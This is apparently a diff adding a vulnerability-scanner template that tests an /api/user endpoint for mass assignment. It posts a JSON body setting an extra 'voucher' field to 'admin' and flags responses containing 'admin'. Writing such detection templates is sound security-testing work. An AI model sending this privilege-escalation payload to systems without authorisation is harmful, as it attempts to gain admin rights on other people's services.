@@ -1,0 +1,18 @@
+id: mass3-261
+name: 'Mass field voucher'
+severity: high
+type: active
+tags:
+  - mass-assignment
+  - auth
+  - api
+description: 'Unfiltered voucher on /api/user'
+requests:
+  - method: POST
+    path: '{{BaseURL}}/api/user'
+    body: '{"name":"a1","voucher":"admin"}'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'admin'
